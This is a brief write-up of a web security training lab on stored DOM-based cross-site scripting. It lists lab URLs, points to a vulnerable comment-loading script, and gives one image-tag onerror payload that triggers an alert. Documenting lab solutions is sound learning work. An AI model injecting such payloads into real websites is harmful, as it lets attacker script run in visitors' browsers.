# Lab: Stored DOM XSS

URL: https://0af6009103611d68809b0802006c0071.web-security-academy.net/

![](./Images/img1.png)

URL: https://0af6009103611d68809b0802006c0071.web-security-academy.net/post?postId=2

![](./Images/img2.png)

# Testing fields:

![](./Images/img3.png)

<br>

URL: view-source:https://0af6009103611d68809b0802006c0071.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js

![](./Images/img4.png)

# Exploitation:

Payload:

```
Pentest</p><img src=x onerror=alert(1)>
```

![](./Images/img5.png)

<br>

![](./Images/img6.png)